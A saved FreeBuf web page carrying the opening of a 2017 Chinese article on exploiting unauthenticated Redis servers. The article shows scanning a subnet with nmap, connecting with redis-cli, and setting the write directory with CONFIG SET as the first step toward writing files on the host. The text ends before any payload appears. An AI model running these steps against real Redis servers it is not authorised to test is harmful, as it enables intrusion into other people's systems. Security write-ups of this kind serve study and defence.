<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  不请自来 | Redis 未授权访问漏洞深度利用 - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="*本文原创作者：yangyangwithgnu@yeah.net（blog），属于FreeBuf原创奖励计划，禁止转载
redis虽然是高性能内存数据库，但也支持将内存数据保存至硬盘上，实现持久化存储。由于 redis 未强制访问鉴权，导致未授权访…" />
<meta name="keywords" content="Redis, 漏洞利用, 最新漏洞报告,漏洞众测平台,漏洞攻击分析,漏洞POC和EXP" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='揭秘：黑客究竟对你的“被盗数据”做了什么？' href='http://www.freebuf.com/news/148194.html' />
<link rel='next' title='让木马病毒DNS数据传输成为历史：看我如何让XShell病毒失效' href='http://www.freebuf.com/articles/network/147444.html' />
<link rel='canonical' href='http://www.freebuf.com/vuls/148758.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=148758' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
    <!--轮播图-->
    <link href="http://static.3001.net/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css">
    <link href="http://static.3001.net/css/new/style.css?ver=20170912568" rel="stylesheet" type="text/css">
    <style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<script type="text/javascript" src="http://static.3001.net/js/new/setint.js"></script>
    <!--轮播图-->
    <script src="http://static.3001.net/js/colum/swiper-3.4.2.min.js"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                                        <!-- column -->
                        <div class="nav">
                            <ul class="nav-child clearfix">
                                <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li data-value="read-menu">
                                    <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                                </li>
                                <li data-value="wenku-menu"><a href="javascript:;" target="_blank">文库<b class="triangle-down triangle-down-04"></b></a></li>
                                <li>
                                    <a href="http://zhuanlan.freebuf.com" target="_blank">专栏</a><b class="icon-betr"></b>
                                </li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li data-value="company-menu"><a href="javascript:;" >企业服务<b class="triangle-down triangle-down-04"></b></a></li>
                                <li data-value="user-menu"><a href="javascript:;" >用户服务<b class="triangle-down triangle-down-04"></b></a></li>
                            </ul>
                        </div>
                                        <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <!--搜索-->
                    <div class="search-form-inner clearfix">
                        <i class="searchdisplayico"></i>
                        <div class="form-group has-active search-col search-form-text">
                            <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch();">
                                <div class="form-group">
                                    <input id="bigq" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                    <button class="submit" type="submit"></button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <!--<script>
                        $('.search-form-inner .searchdisplayico').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $(this).siblings('.search-col').addClass('active');
                        });
                        $('.search-form-inner .search-col').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $('.search-form-inner .search-col').addClass('active');
                        });
                        $(document).click(function() {
                            $('.search-form-inner .search-col').removeClass('active');
                        });
                    </script>-->
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                                                        </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                                                        <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li class="read-classify">
                                    <a href="#">分类阅读<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2 read-classify clearfix">
                                        <li>
                                            <strong>黑客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                                <a href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>极客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                                <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>特色</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                                <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                            </div>
                                        </li>
                                    </ul>
                                </li>
                                <li><a href="http://zhuanlan.freebuf.com/" target="_blank">专栏</a></li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li>
                                    <a href="javascript:;" target="_blank">企业服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank"><strong>企业SRC</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://company.freebuf.com" target="_blank"><strong>企业空间</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/" target="_blank"><strong>安全测试</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.riskivy.com/" target="_blank"><strong>风险感知</strong></a>
                                        </li>

                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">用户服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/newsend" target="_blank"><strong>有奖投稿</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank"><strong>提交漏洞</strong></a>
                                        </li>
                                        <li class="last">
                                            <a href="https://www.vulbox.com/bounties" target="_blank"><strong>参与众测</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">文库<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/wenku" target="_blank"><strong>文库</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://www.freebuf.com/special-subject" target="_blank"><strong>专题</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                                    <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                            </li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
            <div class="dropdown-menu read-menu" id="read-menu">
                <div class="container">
                    <ul class="menu clearfix">
                        <li>
                            <strong>黑客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                <a class="last" href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                            </div>
                        </li>
                        <li>
                            <strong>极客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                <a class="last" href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                            </div>
                        </li>
                        <li>
                            <strong>特色</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                <a class="last" href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu company-menu" id="company-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-src.png"></span>
                                <span class="name">企业SRC</span>
                                <span class="intro">全/半托管式互联网漏洞收集管理</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://company.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-company.png"></span>
                                <span class="name">企业空间</span>
                                <span class="intro">为企业定制信息安全专属门户</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-safety.png"></span>
                                <span class="name">安全测试</span>
                                <span class="intro">国内领先的互联网安全众测服务</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.riskivy.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-risk.png"></span>
                                <span class="name">风险感知</span>
                                <span class="intro">基于IT资产的自动化安全监控</span>
                            </a>
                        </li>

                    </ul>
                </div>
            </div>
            <div class="dropdown-menu user-menu" id="user-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/newsend" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">有奖投稿</span>
                                <span class="intro">与整个行业分享你的经验与见解</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-column.png"></span>
                                <span class="name">申请专栏</span>
                                <span class="intro">自由创作，打造自主内容品牌</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-leak.png"></span>
                                <span class="name">提交漏洞</span>
                                <span class="intro">与数万白帽一起，让互联网更安全</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.vulbox.com/bounties" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">参与众测</span>
                                <span class="intro">挖洞开启自由职业之路</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu wenku-menu" id="wenku-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/wenku" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">文库</span>
                                <span class="intro">最全的FB百科</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="http://www.freebuf.com/special-subject" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">专题</span>
                                <span class="intro">浓缩的安全精华汇总</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<!--<script type="application/javascript">
    var  _value_tab = '';
    $(function(){
        var _that = '', _show_flag = 0;
        $('.header .header-container .nav .nav-child > li:not(input[data-value])').mouseover(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        $('.header').mouseout(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        /*$('.header .header-container .nav .nav-child > li').mouseover(function() {
         _value_tab = $(this).attr('data-value');
         $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
         $('#'+_value_tab).stop().slideDown(100);
         });*/
        $(".header .header-container .nav .nav-child > li").hoverDelay({
            hoverDuring: 500,
            hoverEvent: function(){
                $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
                $('#'+_value_tab).stop().slideDown(100);
            }
        });
        $('.header .dropdown-menu').mouseover(function() {
            _value_tab = $(this).attr('id');
            _that = this;
            $('.nav-child li[data-value="'+_value_tab+'"]').addClass('hover');
            $(this).stop().slideDown(50);
        }).mouseout(function() {
            $('.nav-child li[data-value="'+_value_tab+'"]').removeClass('hover');
            $(_that).stop().slideUp(50);
        });

        $(".nav-small .nav-child > li").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();

            if($(this).find('.nav-child2').is(":hidden")) {
                _show_flag = 1;
                $(this).find('.nav-child2').slideDown();
                $(this).find('.icon-arrow').addClass('bottom');
            }else {
                _show_flag = 0;
                $(this).find('.nav-child2').slideUp();
                $(this).find('.icon-arrow').removeClass('bottom');
            }
            $(this).siblings().find('.nav-child2').slideUp();
            $(this).siblings().find('.icon-arrow').removeClass('bottom');
        });
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
        var that = '';
        $('.header .header-container .nav .nav-child > li').mouseover(function() {
            that = this;
            $(this).find('.dropdown-menu').stop().slideDown(200);
        }).mouseout(function() {
            $(that).find('.dropdown-menu').stop().slideUp(200);
        });
    });
    $(".nav-small .nav-child > li").click(function(event){
        var ev = ev || event;
        ev.stopPropagation();
        $(this).siblings('li').find('.dropdown-menu').hide();
        $(this).find(".dropdown-menu").toggle();
    });
    //鼠标经过(hover)事件的延时处理
    (function($){
        $.fn.hoverDelay = function(options){
            var defaults = {
                hoverDuring: 100,
                outDuring: 100,
                hoverEvent: function(){
                    $.noop();
                },
                outEvent: function(){
                    $.noop();
                }
            };
            var sets = $.extend(defaults,options || {});
            var hoverTimer, outTimer;
            return $(this).each(function(){
                $(this).hover(function(){
                    _value_tab = $(this).attr('data-value');
                    clearTimeout(outTimer);
                    hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
                },function(){
                    clearTimeout(hoverTimer);
                    outTimer = setTimeout(sets.outEvent, sets.outDuring);
                });
            });
        }
    })(jQuery);
</script>-->
<script type="text/javascript" src="http://static.3001.net/js/header/header.js"></script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/layer.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="column-article" data-column="">
            <div class="container pad-top35">
        <div class="row clearfix">
            <div class="col-md-9" id="getWidth">
                                    <div class="reletive search-xs-wrap">
                    <div class="form-group has-active search-col search-xs">
                        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
                            <div class="form-group">
                                <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                <button class="submit" type="submit"></button>
                            </div>
                        </form>
                    </div>
                </div>
                    <script type="text/javascript">
                        var dispatch = function () {
                            console.log(123)
                            var q = document.getElementById("q");
                            if (q.value == "") {
                                q = document.getElementById("bigq");
                            }
                            if (q.value != "") {
                                window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                                return false;
                            } else {
                                return false;
                            }
                        }
                    </script>
                                <div class="article-wrap panel panel-default">
                                                            <div class="articlecontent">
                                                    <div class="title">
                                <h2>
                                    不请自来 | Redis 未授权访问漏洞深度利用                                </h2>
                                <div class="property">
                                                                            <span class="name"><a href="http://www.freebuf.com/author/yangyangwithgnu" title="由 yangyangwithgnu 发布" rel="author">yangyangwithgnu</a></span>
                                                                        <span class="icon-f"></span>
                                    <span class="time">2017-09-25</span>
                                                                                                            <span class="look">共<strong>194913</strong>人围观
                                        ，发现 <strong>11</strong> 个不明物体 </span>                                      </span>
                                                                <span class="tags">
                                      <a href="http://www.freebuf.com/./vuls">漏洞</a></span>
                                    <span class="tags_01"></span>
                                </div>
                            </div>
                                                                                                <div id="contenttxt">
                            <p><b><span style="color: rgb(239, 71, 71);">*本文原创作者：yangyangwithgnu@yeah.net（<a href="https://yangyangwithgnu.github.io/" target="_blank">blog</a>），属于FreeBuf原创奖励计划，禁止转载</span><br /></b></p>
<p><b style="color: rgb(0, 176, 80);">redis虽然是高性能内存数据库，但也支持将内存数据保存至硬盘上，实现持久化存储。由于 redis 未强制访问鉴权，导致未授权访问漏洞频发，入侵者借此控制 redis 间接获得系统写文件的能力，极大提升攻击力。&nbsp;</b></p>
<p>redis未授权漏洞的发现常有两种方式，你可以用 redis-cli 手工针对单个机器验证：</p>
</p>
<pre><code><p>$ redis-cli -p 6379 -h 192.168.56.101</p><p>192.168.56.101:6379&gt; INFO server</p><p># Server</p><p>redis_version:4.0.1</p><p>redis_git_sha1:00000000</p><p>redis_git_dirty:0</p><p>redis_build_id:65864c9f72c0dcf</p><p>redis_mode:standalone</p><p>os:Linux 3.16.0-4-amd64 x86_64</p><p>arch_bits:64</p><p>multiplexing_api:epoll</p><p>atomicvar_api:atomic-builtin</p><p>gcc_version:4.9.2</p><p>process_id:2213</p><p>run_id:f4583ca8759931262b707df016655eabd7b85eed</p><p>tcp_port:6379</p><p>uptime_in_seconds:2101</p><p>uptime_in_days:0</p><p>hz:10</p><p>lru_clock:12289112</p><p>executable:/root/redis-server</p><p>config_file:</p></code></pre>
</p>
<p>其中，INFO server 为登录 redis 后执行的内部命令，用于显示服务端环境信息，比如操作系统的版本、GCC 的版本、redis 的版本等等信息，可见在未输入任何账号/密码情况下，已经成功执行 redis 内部命令，确认存在未授权访问漏洞；你也可以用 nmap 自动批量验证：</p>
</p>
<pre><code><p>$ nmap -v -n -Pn -p 6379 -sV --scriptredis-info 192.168.56.1/24</p><p>...</p><p>Nmap scan report for 192.168.56.101</p><p>Host is up (-0.078s latency).</p><p>PORT&nbsp;&nbsp;&nbsp;&nbsp; STATE SERVICE VERSION</p><p>6379/tcp open&nbsp; redis&nbsp;&nbsp;Redis key-value store 4.0.1 (64 bits)</p><p>| redis-info:</p><p>|&nbsp;&nbsp;Version: 4.0.1</p><p>|&nbsp;&nbsp;Operating System: Linux 3.16.0-4-amd64 x86_64</p><p>|&nbsp;&nbsp;Architecture: 64 bits</p><p>|&nbsp;&nbsp;Process ID: 2213</p><p>|&nbsp;&nbsp;Used CPU (sys): 3.20</p><p>|&nbsp;&nbsp;Used CPU (user): 0.77</p><p>|&nbsp;&nbsp;Connected clients: 2</p><p>|&nbsp;&nbsp;Connected slaves: 0</p><p>|&nbsp;&nbsp;Used memory: 828.64K</p><p>|&nbsp;&nbsp;Role: master</p><p>|&nbsp;&nbsp;Bind addresses:</p><p>|&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0</p><p>|&nbsp;&nbsp;Client connections:</p><p>|_&nbsp;&nbsp;&nbsp;192.168.56.1</p><p>...</p></code></pre>
</p>
<p>其中，redis-info 为 nmap 专用于检查该漏洞的插件，检测范围为 192.168.56.1/24 整个 C 段，从输出结果中也能看到大量 192.168.56.101 的环境信息，成功检测到未授权访问漏洞。</p>
<p>有了未授权访问漏洞，就有了向系统写文件的能力。但，还有个重要前提，redis 可以创建文件但无法创建目录，所以，redis 待写入文件所在的目录必须事先存在。redis 写文件大致分为四个步骤：登录、设置文件路径、创建键/值、保存。&nbsp;</p>
<p>用 redis-cli 连接 redis：</p>
</p>
<pre><code><p>$ redis-cli -p 6379 -h 192.168.56.101</p><p>192.168.56.101:6379&gt;</p><p></p></code></pre>
<p>输入 PING 回显 PONG 则表示登录成功：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; ping</p><p>PONG</p><p></p></code></pre>
<p>说明连接成功。指定写文件的目录：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG SETdir /tmp</p><p>OK</p></code></pre>
</p>
